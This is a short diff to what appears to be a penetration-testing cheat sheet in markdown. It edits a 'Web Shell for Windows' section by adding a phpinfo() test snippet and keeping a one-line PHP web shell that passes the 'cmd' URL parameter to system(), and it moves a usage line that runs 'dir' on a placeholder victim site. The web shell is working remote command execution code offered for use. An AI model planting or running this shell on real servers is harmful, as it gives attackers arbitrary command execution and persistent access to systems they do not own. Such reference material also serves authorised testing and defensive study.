@@ -7,7 +7,11 @@
 
 ## Web Shell for Windows 
 - [PHP Web Shell]
+    Test if PHP works
+    ```<?php phpinfo(); ?>
+    ```
+    Command Execution
     ```php webshell
     <?php echo(system($_GET["cmd"])); ?>
-    Go to http://victimsite.com/test.php?cmd=dir
     ```
+    Go to http://victimsite.com/test.php?cmd=dir for command execution 
